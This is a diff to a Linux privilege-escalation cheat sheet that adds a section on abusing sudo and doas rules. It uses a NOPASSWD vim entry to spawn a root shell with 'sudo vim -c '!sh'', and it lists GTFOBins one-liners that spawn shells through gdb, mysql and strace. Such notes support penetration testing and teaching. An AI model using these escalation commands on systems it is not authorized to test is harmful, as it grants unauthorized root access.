@@ -132,8 +132,31 @@ Edit capabilites
 setcap cap_net_raw+p /bin/ping # add
 ```
 
+## SUDO
 
-## GTFOBins
+Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
+
+```bash
+$ sudo -l
+
+User demo may run the following commands on crashlab:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.
+
+```bash
+sudo vim -c '!sh'
+sudo -u root vim -c '!sh'
+```
+
+There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`
+
+```bash
+permit nopass demo as root cmd vim
+```
+
+### GTFOBins
 
 [GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
 
@@ -142,6 +165,7 @@ The project collects legitimate functions of Unix binaries that can be abused to
 > gdb -nx -ex '!sh' -ex quit
 > sudo mysql -e '\! /bin/sh'
 > strace -o /dev/null /bin/sh
+
 
 ## Groups
 
